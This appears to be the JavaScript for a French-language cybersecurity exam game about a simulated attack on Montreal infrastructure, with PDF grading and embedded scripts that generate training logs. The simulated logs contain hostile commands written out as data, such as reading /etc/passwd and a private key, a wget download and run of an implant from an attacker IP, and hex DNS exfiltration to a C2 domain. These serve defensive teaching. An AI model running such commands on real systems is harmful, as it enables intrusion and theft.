        showDisconnectScreen(grade);
    }, 1500);
}

// ── PDF GENERATION ────────────────────────────────────────
function generatePDF(grade, reportText, commentText) {
    const { jsPDF } = window.jspdf;
    const doc = new jsPDF({ unit: 'mm', format: 'a4' });
    const pageWidth = doc.internal.pageSize.getWidth();
    const margin = 15;
    const usable = pageWidth - margin * 2;
    let y = 20;

    function checkPage(needed) {
        if (y + needed > 275) {
            doc.addPage();
            y = 20;
        }
    }

    function addTitle(text, size) {
        checkPage(12);
        doc.setFontSize(size || 14);
        doc.setFont('helvetica', 'bold');
        doc.text(text, margin, y);
        y += (size || 14) * 0.5 + 2;
    }

    function addText(text, size) {
        doc.setFontSize(size || 10);
        doc.setFont('helvetica', 'normal');
        const lines = doc.splitTextToSize(text, usable);
        lines.forEach(line => {
            checkPage(6);
            doc.text(line, margin, y);
            y += 5;
        });
    }

    function addLine() {
        checkPage(5);
        doc.setDrawColor(0, 212, 255);
        doc.setLineWidth(0.5);
        doc.line(margin, y, pageWidth - margin, y);
        y += 5;
    }

    // Header
    doc.setFillColor(10, 14, 23);
    doc.rect(0, 0, pageWidth, 40, 'F');
    doc.setTextColor(0, 212, 255);
    doc.setFontSize(18);
    doc.setFont('helvetica', 'bold');
    doc.text('OPERATION BLACKOUT-OMEGA', pageWidth / 2, 15, { align: 'center' });
    doc.setFontSize(11);
    doc.text('RECAPITULATIF D\'EXAMEN — CLASSIFICATION : SECRET', pageWidth / 2, 23, { align: 'center' });
    doc.setFontSize(9);
    doc.setFont('helvetica', 'normal');
    doc.text('Document genere automatiquement — Non modifiable', pageWidth / 2, 30, { align: 'center' });
    doc.setTextColor(0, 0, 0);
    y = 48;

    // Student info
    addTitle('INFORMATIONS DE L\'AGENT');
    addLine();
    addText('Nom / Prenom : ' + state.agentName);
    addText('Numero etudiant : ' + state.studentId);
    addText('Date : ' + new Date().toLocaleString('fr-CA'));
    addText('Niveaux completes : ' + state.completedLevels.join(', '));
    y += 5;

    // QCM Grade Summary
    addTitle('RESULTATS QCM (sur 25 points)');
    addLine();
    const pct = Math.round((grade.totalCorrect / grade.totalQuestions) * 100);
    addText('NOTE QCM : ' + grade.qcmScore + ' / 25 pts (' + pct + '% de bonnes reponses)');
    y += 2;
    const s = grade.sections;
    addText('  Niveau 0 - Reseaux : ' + s.l0_net.correct + '/' + s.l0_net.total);
    addText('  Niveau 0 - Adressage : ' + s.l0_fill.correct + '/' + s.l0_fill.total);
    addText('  Niveau 0 - Git : ' + s.l0_git.correct + '/' + s.l0_git.total);
    addText('  Niveau 0 - Docker : ' + s.l0_docker.correct + '/' + s.l0_docker.total);
    addText('  Niveau 3 - Scenario : ' + s.l3.correct + '/' + s.l3.total);
    addText('  Score Niv.0 : ' + grade.l0Score + '/20 pts | Score Niv.3 : ' + grade.l3Score + '/5 pts');
    y += 3;

    // Full Barème
    addTitle('BAREME GENERAL (100 points)');
    addLine();
    addText('  Niveau 0 - Theorie (QCM + tableau) ........... 20 pts');
    addText('  Niveau 1 - Analyse des logs .................. 10 pts');
    addText('  Niveau 2 - Analyse reseau .................... 10 pts');
    addText('  Niveau 3 - Scenario Git & Docker (QCM) ....... 5 pts');
    addText('  Niveau 4 - Decodage hex & DNS ................ 15 pts');
    addText('  Niveau 5 - Scripts de defense ................ 15 pts');
    addText('  Niveau 6 - Rapport d\'incident ................ 25 pts');
    addText('  TOTAL ....................................... 100 pts');
    y += 5;

    // Detailed QCM answers
    addTitle('DETAIL DES REPONSES QCM');
    addLine();

    const allQcmKeys = Object.keys(QCM_ANSWER_KEY);
    const l0Answers = state.examAnswers['level0'] || {};
    const l3Answers = state.examAnswers['level3'] || {};

    allQcmKeys.forEach(key => {
        const questionLabel = QCM_QUESTIONS[key] || key;
        const isL3 = key.startsWith('q3');
        const answers = isL3 ? l3Answers : l0Answers;
        const given = answers[key] || 'N/A';
        const correct = QCM_ANSWER_KEY[key];
        let isCorrect = false;

        if (key.startsWith('fill')) {
            isCorrect = given.toLowerCase().trim().replace(/\s/g, '') === correct.toLowerCase().trim().replace(/\s/g, '');
        } else {
            isCorrect = given === correct;
        }

        const status = (given === 'na' || given === 'N/A') ? '[N/A]' : (isCorrect ? '[OK]' : '[X]');
        checkPage(6);
        addText(status + ' ' + questionLabel + ' — Reponse: ' + given, 9);
    });
    y += 5;

    // Terminal answers
    addTitle('REPONSES TERMINALES (commandes)');
    addLine();
    const termAnswers = state.examAnswers.terminalAnswers || {};
    const termLevelNames = [
        { key: 'level1', name: 'Niveau 1 — Analyse des logs' },
        { key: 'level2', name: 'Niveau 2 — Reseaux' },
        { key: 'level4', name: 'Niveau 4 — Hex/DNS' },
        { key: 'level5', name: 'Niveau 5 — Scripts' }
    ];
    termLevelNames.forEach(({ key, name }) => {
        checkPage(8);
        addText(name + ' :', 10);
        const levelAnswers = termAnswers[key];
        if (levelAnswers && Object.keys(levelAnswers).length > 0) {
            Object.values(levelAnswers).forEach(ans => {
                checkPage(10);
                addText('  [OK] ' + ans.label, 9);
                addText('    $ ' + ans.command, 8);
            });
        } else {
            addText('  (aucune reponse enregistree)', 9);
        }
        y += 2;
    });
    y += 5;

    // Text answers (written questions)
    const textAnswers = state.examAnswers.textAnswers || {};
    const textLevelLabels = {
        level1: 'Niveau 1 — Analyse des logs',
        level2: 'Niveau 2 — Reseaux',
        level4: 'Niveau 4 — Hex/DNS',
        level5: 'Niveau 5 — Scripts',
        level6: 'Niveau 6 — Rapport d\'incident'
    };

    const hasAnyText = Object.keys(textAnswers).length > 0;
    if (hasAnyText) {
        addTitle('REPONSES ECRITES (questions)');
        addLine();

        for (const [lvl, label] of Object.entries(textLevelLabels)) {
            const lvlAnswers = textAnswers[lvl];
            if (!lvlAnswers || Object.keys(lvlAnswers).length === 0) continue;

            checkPage(8);
            addText(label + ' :', 10);

            for (const [qKey, answer] of Object.entries(lvlAnswers)) {
                if (!answer) continue;
                checkPage(12);
                addText('  [' + qKey + ']', 9);
                addText('    ' + answer, 8);
            }
            y += 2;
        }
        y += 5;
    }

    // Report
    addTitle('RAPPORT D\'INCIDENT');
    addLine();
    addText(reportText || '(aucun rapport)');
    y += 5;

    // Comment
    addTitle('COMMENTAIRE');
    addLine();
    addText(commentText || '(aucun commentaire)');
    y += 5;

    // Footer
    checkPage(15);
    addLine();
    doc.setFontSize(8);
    doc.setFont('helvetica', 'italic');
    doc.text('Document genere par le systeme CERT-QC — Operation BLACKOUT-OMEGA', margin, y);
    y += 4;
    doc.text('Ce document est un recapitulatif d\'examen et ne peut etre modifie.', margin, y);

    // Save
    const filename = 'examen_blackout_' + state.agentName.toLowerCase().replace(/\s+/g, '_') + '_' + state.studentId + '.pdf';
    doc.save(filename);
}

// ── FIN EXAMEN ────────────────────────────────────────────
function setupFinExamen() {
    const btnFin = document.getElementById('btn-fin-examen');
    const overlay = document.getElementById('overlay-fin-examen');
    const btnCancel = document.getElementById('btn-fin-cancel');
    const btnConfirm = document.getElementById('btn-fin-confirm');

    if (btnFin && overlay) {
        btnFin.addEventListener('click', () => {
            overlay.classList.remove('hidden');
        });
    }

    // Prevent clicks inside modal from closing overlay
    const modal = overlay ? overlay.querySelector('.fin-examen-modal') : null;
    if (modal) {
        modal.addEventListener('click', (e) => {
            e.stopPropagation();
        });
    }

    if (btnCancel && overlay) {
        btnCancel.addEventListener('click', (e) => {
            e.stopPropagation();
            overlay.classList.add('hidden');
        });
    }

    if (overlay) {
        overlay.addEventListener('click', (e) => {
            if (e.target === overlay) overlay.classList.add('hidden');
        });
    }

    if (btnConfirm) {
        btnConfirm.addEventListener('click', (e) => {
            e.stopPropagation();
            console.log('Fin examen confirmé');
            executeFinExamen();
        });
    } else {
        console.warn('btn-fin-confirm not found');
    }
}

function executeFinExamen() {
    try {
        // Collect any unanswered QCM answers still in the DOM
        ['level0', 'level3'].forEach(level => {
            if (!state.examAnswers[level]) {
                const panel = document.getElementById('quiz-' + level);
                if (panel) {
                    const answers = {};
                    panel.querySelectorAll('.qcm-item').forEach(item => {
                        const name = item.dataset.qcm;
                        const selected = panel.querySelector('input[name="' + name + '"]:checked');
                        answers[name] = selected ? selected.value : 'na';
                    });
                    panel.querySelectorAll('.qcm-fill').forEach(input => {
                        answers[input.name] = input.value.trim() || 'N/A';
                    });
                    state.examAnswers[level] = answers;
                }
            }
        });

        // Collect report text if any
        const reportTextarea = document.getElementById('report-textarea');
        const reportComment = document.getElementById('report-comment');
        if (!state.examAnswers['report']) {
            state.examAnswers['report'] = reportTextarea ? reportTextarea.value : '';
        }
        if (!state.examAnswers['comment']) {
            state.examAnswers['comment'] = reportComment ? reportComment.value : '';
        }
        saveState();

        // Calculate grade
        const grade = calculateGrade();
        const reportText = state.examAnswers['report'] || '';
        const commentText = state.examAnswers['comment'] || '';

        // Try to generate PDF (don't let it block disconnection)
        try {
            generatePDF(grade, reportText, commentText);
        } catch (pdfErr) {
            console.error('Erreur génération PDF:', pdfErr);
        }

        // Hide confirmation overlay
        const overlay = document.getElementById('overlay-fin-examen');
        if (overlay) overlay.classList.add('hidden');

        // Show disconnection screen
        showDisconnectScreen(grade);
    } catch (err) {
        console.error('Erreur fin examen:', err);
        alert('Erreur lors de la fin de l\'examen: ' + err.message);
    }
}

function showDisconnectScreen(grade) {
    const pct = Math.round((grade.totalCorrect / grade.totalQuestions) * 100);

    // Extract nom / prenom from agentName (stored as "PRENOM NOM")
    const nameParts = state.agentName.split(' ');
    const prenom = nameParts[0] || '';
    const nom = nameParts.slice(1).join(' ') || '';

    // Save submitted flag (keeps identity only)
    try {
        localStorage.setItem('blackout_submitted', JSON.stringify({
            nom: nom,
            prenom: prenom,
            studentId: state.studentId
        }));
    } catch(e) {}

    // Clear all exam data from localStorage
    localStorage.removeItem('blackout_save');
    localStorage.removeItem('blackout_timer');
    localStorage.removeItem('blackout_restart');

    // Replace entire screen with disconnect message
    const main = document.getElementById('screen-main');
    if (main) {
        main.innerHTML = `
            <div class="disconnect-screen">
                <div class="disconnect-box">
                    <div class="disconnect-icon">🔒</div>
                    <h1>SESSION TERMINÉE</h1>
                    <p class="disconnect-agent">Agent ${state.agentName} — ${state.studentId}</p>
                    <div class="disconnect-grade">
                        <span class="disconnect-score">QCM : ${grade.qcmScore} / 25 pts</span>
                        <span class="disconnect-pct">(${pct}%)</span>
                    </div>
                    <p class="disconnect-info">Votre PDF récapitulatif a été téléchargé automatiquement.</p>
                    <p class="disconnect-info">Niveaux complétés : ${state.completedLevels.join(', ') || 'aucun'}</p>
                    <div class="disconnect-ascii">
<pre>
    ╔══════════════════════════════════════════╗
    ║                                          ║
    ║    OPÉRATION BLACKOUT-Ω                  ║
    ║    SESSION DÉCONNECTÉE                   ║
    ║                                          ║
    ║    PDF GÉNÉRÉ ET TÉLÉCHARGÉ              ║
    ║    EXAMEN ENREGISTRÉ                     ║
    ║                                          ║
    ║    ⛔ TOUTE RECONNEXION IMPOSSIBLE        ║
    ║                                          ║
    ╚══════════════════════════════════════════╝
</pre>
                    </div>
                    <p class="disconnect-footer">Vous pouvez fermer cette page.</p>
                </div>
            </div>
        `;
    }

    // Stop the timer
    if (state.timerInstance) {
        state.timerInstance.stop();
    }
}

function showSubmittedScreen(nom, prenom, studentId) {
    // Hide all screens
    document.querySelectorAll('.screen').forEach(s => {
        s.classList.remove('active');
        s.style.display = 'none';
    });

    // Show main screen with blocked message
    const main = document.getElementById('screen-main');
    if (main) {
        main.style.display = '';
        main.classList.add('active');
        main.innerHTML = `
            <div class="disconnect-screen">
                <div class="disconnect-box">
                    <div class="disconnect-icon">⛔</div>
                    <h1>EXAMEN DÉJÀ SOUMIS</h1>
                    <p class="disconnect-agent" style="font-size: 1.3rem; margin: 20px 0;">
                        ${prenom} ${nom} — ${studentId}
                    </p>
                    <div class="disconnect-ascii">
<pre>
    ╔══════════════════════════════════════════╗
    ║                                          ║
    ║    OPÉRATION BLACKOUT-Ω                  ║
    ║                                          ║
    ║    CET EXAMEN A DÉJÀ ÉTÉ SOUMIS         ║
    ║    POUR CET ÉTUDIANT.                    ║
    ║                                          ║
    ║    AUCUNE RECONNEXION AUTORISÉE.         ║
    ║    CONTACTEZ VOTRE PROFESSEUR            ║
    ║    EN CAS DE PROBLÈME.                   ║
    ║                                          ║
    ╚══════════════════════════════════════════╝
</pre>
                    </div>
                    <p class="disconnect-footer" style="margin-top: 20px;">Accès définitivement verrouillé. Vous pouvez fermer cette page.</p>
                </div>
            </div>
        `;
    }
}


// ── RADIO MESSAGES ────────────────────────────────────────
function startRadio() {
    CONFIG.radioMessages.forEach(msg => {
        setTimeout(() => {
            addRadioMessage(msg.time, msg.text, msg.urgent);
        }, msg.delay);
    });
}

function addRadioMessage(time, text, urgent) {
    const feed = document.getElementById('radio-feed');
    if (!feed) return;

    const div = document.createElement('div');
    div.className = 'radio-msg' + (urgent ? ' urgent' : '');
    div.innerHTML = `<span class="radio-time">[${time}]</span><span class="radio-text">${text}</span>`;
    feed.appendChild(div);
    feed.scrollTop = feed.scrollHeight;

    if (urgent) {
        showToast('📻 RADIO CERT-QC', text, true);
    }
}

// ── TOAST NOTIFICATIONS ───────────────────────────────────
function showToast(sender, message, urgent) {
    const container = document.getElementById('toast-container');
    if (!container) return;

    const toast = document.createElement('div');
    toast.className = 'toast' + (urgent ? ' urgent' : '');
    toast.innerHTML = `<div class="toast-sender">${sender}</div><div>${message}</div>`;
    container.appendChild(toast);

    setTimeout(() => {
        if (toast.parentNode) toast.parentNode.removeChild(toast);
    }, 9000);
}

// ── SOUND ─────────────────────────────────────────────────
function setupSound() {
    const btn = document.getElementById('btn-sound');
    const audio = document.getElementById('ambiance-audio');
    if (!btn || !audio) return;

    btn.addEventListener('click', () => {
        state.soundEnabled = !state.soundEnabled;
        if (state.soundEnabled) {
            audio.volume = 0.3;
            audio.play().catch(() => {});
            btn.textContent = '🔊';
            btn.classList.add('active');
        } else {
            audio.pause();
            btn.textContent = '🔇';
            btn.classList.remove('active');
        }
    });
}

// ── INFO OVERLAYS (Contexte & Info Utile) ─────────────────
function setupInfoOverlays() {
    const btnContexte = document.getElementById('btn-contexte');
    const btnInfo = document.getElementById('btn-info-utile');
    const overlayContexte = document.getElementById('overlay-contexte');
    const overlayInfo = document.getElementById('overlay-info-utile');

    if (btnContexte && overlayContexte) {
        btnContexte.addEventListener('click', () => overlayContexte.classList.remove('hidden'));
    }
    if (btnInfo && overlayInfo) {
        btnInfo.addEventListener('click', () => overlayInfo.classList.remove('hidden'));
    }

    // Barème button
    const btnBareme = document.getElementById('btn-bareme');
    const overlayBareme = document.getElementById('overlay-bareme');
    if (btnBareme && overlayBareme) {
        btnBareme.addEventListener('click', () => overlayBareme.classList.remove('hidden'));
    }

    // Close buttons
    document.querySelectorAll('.info-overlay-close').forEach(btn => {
        btn.addEventListener('click', () => {
            const target = document.getElementById(btn.dataset.close);
            if (target) target.classList.add('hidden');
        });
    });

    // Click outside to close
    document.querySelectorAll('.info-overlay').forEach(overlay => {
        overlay.addEventListener('click', (e) => {
            if (e.target === overlay) overlay.classList.add('hidden');
        });
    });

    // ESC key to close
    document.addEventListener('keydown', (e) => {
        if (e.key === 'Escape') {
            document.querySelectorAll('.info-overlay').forEach(o => o.classList.add('hidden'));
        }
    });
}

// ── SCRIPT DOWNLOADS ──────────────────────────────────────
const DOWNLOADABLE_SCRIPTS = {
'generer_logs_blackout.sh': `#!/bin/bash
# ================================================================
# generer_logs_blackout.sh — Génère tous les logs de l'incident
# OPÉRATION BLACKOUT-Ω | Exécuter AVANT la séance
# Usage : bash generer_logs_blackout.sh
# ================================================================

mkdir -p logs_blackout
echo "🔴 OPÉRATION BLACKOUT-Ω — Génération des fichiers..."

cat > logs_blackout/pare_feu.log << 'EOF'
# FORMAT : [TIMESTAMP] ACTION PROTO SRC -> DST PORT TAILLE COUCHE
[2026-03-14 21:33:19] BLOCK  TCP  185.220.101.47  -> 132.207.88.1   PORT=23    64B    L4-Transport
[2026-03-14 21:33:20] BLOCK  TCP  185.220.101.47  -> 132.207.88.1   PORT=3389  64B    L4-Transport
[2026-03-14 21:33:21] BLOCK  TCP  185.220.101.47  -> 132.207.88.1   PORT=445   64B    L4-Transport
[2026-03-14 21:33:22] BLOCK  TCP  185.220.101.47  -> 132.207.88.1   PORT=135   64B    L4-Transport
[2026-03-14 21:33:23] BLOCK  TCP  185.220.101.47  -> 132.207.88.1   PORT=5985  64B    L4-Transport
[2026-03-14 21:45:01] ALLOW  TCP  172.16.2.10     -> 185.220.101.47 PORT=25    8192B  L4-Transport
[2026-03-14 21:45:02] ALLOW  TCP  172.16.2.10     -> 185.220.101.47 PORT=25    8192B  L4-Transport
[2026-03-14 21:45:03] ALLOW  TCP  172.16.2.10     -> 185.220.101.47 PORT=25    8192B  L4-Transport
[2026-03-14 22:00:00] ALLOW  ICMP 185.220.101.47  -> 132.207.88.1   TYPE=PING  84B    L3-Reseau
[2026-03-14 22:00:01] ALLOW  ICMP 132.207.88.1    -> 185.220.101.47 TYPE=PING  84B    L3-Reseau
[2026-03-14 22:01:00] ALLOW  ICMP 185.220.101.47  -> 172.16.1.100   TYPE=PING  1480B  L3-Reseau
[2026-03-14 22:01:01] ALLOW  ICMP 172.16.1.100    -> 185.220.101.47 TYPE=PING  1480B  L3-Reseau
[2026-03-14 22:02:00] ALLOW  ICMP 185.220.101.47  -> 172.16.2.10    TYPE=PING  1480B  L3-Reseau
[2026-03-14 22:02:01] ALLOW  ICMP 172.16.2.10     -> 185.220.101.47 TYPE=PING  1480B  L3-Reseau
[2026-03-14 22:10:15] ALLOW  UDP  185.220.101.47  -> 172.16.1.100   PORT=53    512B   L4-Transport
[2026-03-14 22:10:16] ALLOW  UDP  172.16.1.100    -> 185.220.101.47 PORT=53    4096B  L4-Transport
[2026-03-14 22:10:17] ALLOW  UDP  185.220.101.47  -> 172.16.1.100   PORT=53    512B   L4-Transport
[2026-03-14 22:10:18] ALLOW  UDP  172.16.1.100    -> 185.220.101.47 PORT=53    4096B  L4-Transport
[2026-03-14 22:10:19] ALLOW  UDP  185.220.101.47  -> 172.16.1.100   PORT=53    512B   L4-Transport
[2026-03-14 23:00:00] ALLOW  TCP  192.168.100.88  -> 185.220.101.47 PORT=443   65535B L4-Transport
[2026-03-14 23:15:00] ALLOW  TCP  10.100.1.88     -> 185.220.101.47 PORT=4444  65535B L4-Transport
[2026-03-14 23:45:00] ALLOW  TCP  10.100.3.200    -> 185.220.101.47 PORT=9001  65535B L4-Transport
[2026-03-14 23:58:00] ALLOW  TCP  10.100.2.100    -> 185.220.101.47 PORT=502   65535B L4-Transport
EOF

cat > logs_blackout/arp_poison.log << 'EOF'
# FORMAT : [TIMESTAMP] EVENEMENT  IP  MAC  NOTE
[2026-03-14 22:45:00] ARP-NORMAL    10.100.3.1    AA:BB:CC:DD:EE:01  Routeur hôpital - annonce normale
[2026-03-14 22:45:01] ARP-NORMAL    10.100.3.20   AA:BB:CC:DD:EE:20  Serveur patients -> routeur OK
[2026-03-14 22:45:02] ARP-NORMAL    10.100.3.55   AA:BB:CC:DD:EE:55  Serveur vital -> routeur OK
[2026-03-14 22:50:00] ARP-GRATUIT   10.100.3.200  DE:AD:BE:EF:00:01  ANOMALIE: ARP gratuit non sollicité
[2026-03-14 22:50:01] ARP-GRATUIT   10.100.3.200  DE:AD:BE:EF:00:01  ANOMALIE: répété
[2026-03-14 22:50:02] ARP-GRATUIT   10.100.3.200  DE:AD:BE:EF:00:01  ANOMALIE: répété
[2026-03-14 22:50:03] ARP-GRATUIT   10.100.3.200  DE:AD:BE:EF:00:01  ANOMALIE: répété
[2026-03-14 22:50:10] ARP-CONFLIT   10.100.3.1    DE:AD:BE:EF:00:01  CRITIQUE: MAC du routeur falsifiée
[2026-03-14 22:50:11] ARP-CONFLIT   10.100.3.1    DE:AD:BE:EF:00:01  CRITIQUE: MAC du routeur falsifiée
[2026-03-14 22:51:00] ARP-POISON    10.100.3.20   DE:AD:BE:EF:00:01  MITM: trafic patients intercepté
[2026-03-14 22:51:01] ARP-POISON    10.100.3.55   DE:AD:BE:EF:00:01  MITM: trafic support vital intercepté
[2026-03-14 22:52:00] ARP-INTERCEPT 10.100.3.200  DE:AD:BE:EF:00:01  Données dossiers patients capturées
[2026-03-14 22:52:01] ARP-INTERCEPT 10.100.3.200  DE:AD:BE:EF:00:01  Données support vital capturées
[2026-03-14 23:00:00] ARP-NORMAL    10.100.3.1    AA:BB:CC:DD:EE:01  Routeur envoie sa vraie MAC
[2026-03-14 23:00:01] ARP-CONFLIT   10.100.3.1    DE:AD:BE:EF:00:01  CRITIQUE: attaquant répond plus vite
EOF

cat > logs_blackout/icmp_tunnel.log << 'EOF'
# FORMAT : [TIMESTAMP] TYPE  SRC  DST  TAILLE  STATUT  CONTENU
# Ping normal = 32 à 84 octets. Au-delà = suspect = tunnel de données
[2026-03-14 22:00:00] ICMP-REQ  185.220.101.47  132.207.88.1   84B    NORMAL   ping test basique
[2026-03-14 22:00:01] ICMP-REP  132.207.88.1    185.220.101.47 84B    NORMAL   reponse ping
[2026-03-14 22:01:00] ICMP-REQ  185.220.101.47  172.16.1.100   1480B  SUSPECT  cmd:ls /var/www/html
[2026-03-14 22:01:01] ICMP-REP  172.16.1.100    185.220.101.47 1480B  SUSPECT  rep:index.html config.php .env
[2026-03-14 22:02:00] ICMP-REQ  185.220.101.47  172.16.2.10    1480B  SUSPECT  cmd:cat /etc/passwd
[2026-03-14 22:02:01] ICMP-REP  172.16.2.10     185.220.101.47 1480B  SUSPECT  rep:root:x:0:0::/root:/bin/bash
[2026-03-14 22:03:00] ICMP-REQ  185.220.101.47  172.16.2.10    1480B  SUSPECT  cmd:cat /etc/ssl/private/mail.key
[2026-03-14 22:03:01] ICMP-REP  172.16.2.10     185.220.101.47 4096B  SUSPECT  rep:-----BEGIN RSA PRIVATE KEY-----
[2026-03-14 22:10:00] ICMP-REQ  185.220.101.47  172.16.1.100   1480B  SUSPECT  cmd:wget http://185.220.101.47/implant.py
[2026-03-14 22:10:01] ICMP-REP  172.16.1.100    185.220.101.47 84B    SUSPECT  rep:OK telechargement reussi
[2026-03-14 22:15:00] ICMP-REQ  185.220.101.47  172.16.1.100   1480B  SUSPECT  cmd:python3 implant.py
[2026-03-14 22:15:01] ICMP-REP  172.16.1.100    185.220.101.47 84B    SUSPECT  rep:PID=31415 actif
EOF

cat > logs_blackout/dns_hex.log << 'EOF'
# FORMAT : [TIMESTAMP] TYPE  DOMAINE  SRC  ANOMALIE
# Technique : DNS Tunneling — données encodées en HEXADÉCIMAL dans les sous-domaines
# Exemple : "root" en hex = 726f6f74
# Le domaine C2 de l'attaquant est : blackout-c2.xyz
[2026-03-14 22:10:15] DNS-OK      www.google.com                                172.16.1.100  NORMAL
[2026-03-14 22:10:16] DNS-OK      api.github.com                                172.16.1.100  NORMAL
[2026-03-14 22:10:17] DNS-TUNNEL  726f6f74.blackout-c2.xyz                      172.16.1.100  SUSPECT
[2026-03-14 22:10:18] DNS-TUNNEL  3a783a303a30.blackout-c2.xyz                  172.16.1.100  SUSPECT
[2026-03-14 22:10:19] DNS-TUNNEL  70617373776f7264.blackout-c2.xyz              172.16.1.100  SUSPECT
[2026-03-14 22:10:20] DNS-TUNNEL  41646d316e323032342e.blackout-c2.xyz          172.16.1.100  SUSPECT
[2026-03-14 22:10:21] DNS-TUNNEL  2f6574632f736861646f77.blackout-c2.xyz        172.16.1.100  SUSPECT
[2026-03-14 22:45:00] DNS-OK      connectivity.check.ubuntu.com                 10.100.1.88   NORMAL
[2026-03-14 22:45:01] DNS-TUNNEL  736361646132.blackout-c2.xyz                  10.100.1.88   SUSPECT
[2026-03-14 22:45:02] DNS-TUNNEL  706c632d61636365732e.blackout-c2.xyz          10.100.1.88   SUSPECT
[2026-03-14 22:45:03] DNS-TUNNEL  72657365617563656c656374.blackout-c2.xyz      10.100.1.88   SUSPECT
[2026-03-14 23:00:00] DNS-OK      update.docker.com                             192.168.100.88 NORMAL
[2026-03-14 23:00:01] DNS-TUNNEL  676974687562.blackout-c2.xyz                  192.168.100.88 SUSPECT
[2026-03-14 23:00:02] DNS-TUNNEL  746f6b656e2d61646d696e.blackout-c2.xyz        192.168.100.88 SUSPECT
EOF

cat > logs_blackout/scada_alerte.log << 'EOF'
# FORMAT : [TIMESTAMP] PLC  PARAMETRE  LU  REEL  SEUIL  STATUS
[2026-03-14 23:30:00] PLC-01  TENSION_kV        120.5  120.5  100-130  NORMAL
[2026-03-14 23:30:01] PLC-01  FREQUENCE_Hz      60.02  60.02  59.5-60.5  NORMAL
[2026-03-14 23:30:02] PLC-02  CHARGE_%          72.3   72.3   0-90       NORMAL
[2026-03-14 23:58:00] PLC-01  TENSION_kV        145.8  120.5  100-130  ALERTE  VALEUR_FALSIFIEE
[2026-03-14 23:58:01] PLC-01  FREQUENCE_Hz      61.80  60.02  59.5-60.5  ALERTE  VALEUR_FALSIFIEE
[2026-03-14 23:58:02] PLC-02  CHARGE_%          98.9   72.3   0-90       ALERTE  VALEUR_FALSIFIEE
[2026-03-14 23:58:30] PLC-01  DISJONCTEUR_A     OUVERT  FERME  --  CRITIQUE  COMMANDE_NON_AUTORISEE
[2026-03-14 23:58:31] PLC-01  DISJONCTEUR_B     OUVERT  FERME  --  CRITIQUE  COMMANDE_NON_AUTORISEE
[2026-03-14 23:58:32] PLC-02  DISJONCTEUR_C     OUVERT  FERME  --  CRITIQUE  COMMANDE_NON_AUTORISEE
[2026-03-14 23:59:00] SCADA   ZONES_AFFECTEES   MTL-CENTRE,PLATEAU,ROSEMONT  --  CRITIQUE  780000_RESIDENTS
[2026-03-14 23:59:10] PLC-01  DOSAGE_CHLORE     15mg/L  3mg/L  max=5mg/L  DANGER  SEUIL_TOXIQUE
EOF

cat > logs_blackout/table_routage.txt << 'EOF'
# Table de routage — Routeur central CSIVM
# ──────────────────────────────────────────────────────────────────
Destination      Masque           Passerelle       Interface  Status
──────────────── ──────────────── ──────────────── ────────── ──────
0.0.0.0          0.0.0.0          132.207.88.254   eth0       UP
10.100.0.0       255.255.0.0      10.100.0.1       eth1       UP
10.100.1.0       255.255.255.0    10.100.1.1       eth1       UP
10.100.2.0       255.255.255.0    10.100.2.1       eth1       UP
10.100.3.0       255.255.255.0    10.100.3.1       eth1       UP
172.16.0.0       255.240.0.0      172.16.0.1       eth2       UP
192.168.100.0    255.255.255.0    192.168.100.1    eth3       UP

# Routes suspectes ajoutées cette nuit (NON AUTORISÉES) :
10.100.2.0       255.255.255.0    192.168.100.88   eth3       ROUTE_INJECTEE
10.100.3.0       255.255.255.0    192.168.100.88   eth3       ROUTE_INJECTEE
EOF

echo ""
echo "✅ Fichiers créés dans logs_blackout/ :"
ls -lh logs_blackout/
`,

'simulateur_blackout.sh': `#!/bin/bash
# ================================================================
# simulateur_blackout.sh — À lancer EN DIRECT sur Teams
# Usage : bash simulateur_blackout.sh
# ================================================================

ROUGE='\\033[0;31m'
VERT='\\033[0;32m'
JAUNE='\\033[0;33m'
CYAN='\\033[0;36m'
MAGENTA='\\033[0;35m'
GRAS='\\033[1m'
RESET='\\033[0m'

clear
echo -e "\$\{ROUGE\}\$\{GRAS\}"
echo "  ██████╗ ██╗      █████╗  ██████╗██╗  ██╗ ██████╗ ██╗   ██╗████████╗"
echo "  ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔═══██╗██║   ██║╚══██╔══╝"
echo "  ██████╔╝██║     ███████║██║     █████╔╝ ██║   ██║██║   ██║   ██║"
echo "  ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██║   ██║██║   ██║   ██║"
echo "  ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗╚██████╔╝╚██████╔╝   ██║"
echo -e "\$\{RESET\}"
echo -e "\$\{MAGENTA\}  OPÉRATION BLACKOUT-Ω — MONTRÉAL — 14 MARS 2026 23:58\$\{RESET\}"
echo ""
sleep 2

phases=(
    "\$\{CYAN\}[23:58:01]\$\{RESET\} Paquets ICMP suspects détectés sur DMZ (taille: 1480B au lieu de 84B)"
    "\$\{ROUGE\}[23:58:05]\$\{RESET\} ⚠  TUNNEL ICMP actif : 185.220.101.47 commande les serveurs via ping"
    "\$\{CYAN\}[23:58:10]\$\{RESET\} Requêtes DNS suspectes vers blackout-c2.xyz — données en hexadécimal"
    "\$\{ROUGE\}[23:58:15]\$\{RESET\} ⚠  Exfiltration confirmée — credentials encodés en hex dans DNS"
    "\$\{CYAN\}[23:58:20]\$\{RESET\} ARP poisoning actif sur 10.100.3.0/24 — sous-réseau du CHUM"
    "\$\{ROUGE\}[23:58:25]\$\{RESET\} ⚠  MITM établi — tout le trafic hospitalier passe par l'attaquant"
    "\$\{ROUGE\}[23:58:50]\$\{RESET\} ████ COMMANDES ENVOYÉES AUX AUTOMATES SCADA ████"
    "\$\{ROUGE\}[23:58:55]\$\{RESET\} ⚠  SECTEUR A — DISJONCTEUR OUVERT"
    "\$\{ROUGE\}[23:58:56]\$\{RESET\} ⚠  SECTEUR B — DISJONCTEUR OUVERT"
    "\$\{ROUGE\}[23:58:57]\$\{RESET\} ⚠  SECTEUR C — DISJONCTEUR OUVERT"
    "\$\{ROUGE\}[23:59:10]\$\{RESET\} ⚠  DOSAGE CHLORE : 15 mg/L détecté (seuil légal : 5 mg/L)"
    "\$\{MAGENTA\}[23:59:30]\$\{RESET\} 🔴 ALERTE MAXIMALE — CERT-QC ACTIVÉ — C'EST VOUS"
)

for phase in "\$\{phases[@]\}"; do
    echo -e "  \$phase"
    sleep 1.5
done

echo ""
echo -e "\$\{ROUGE\}\$\{GRAS\}  780 000 RÉSIDENTS MENACÉS — ANALYSEZ, ISOLEZ, NEUTRALISEZ\$\{RESET\}"
echo ""
`,

};

function setupDownloads() {
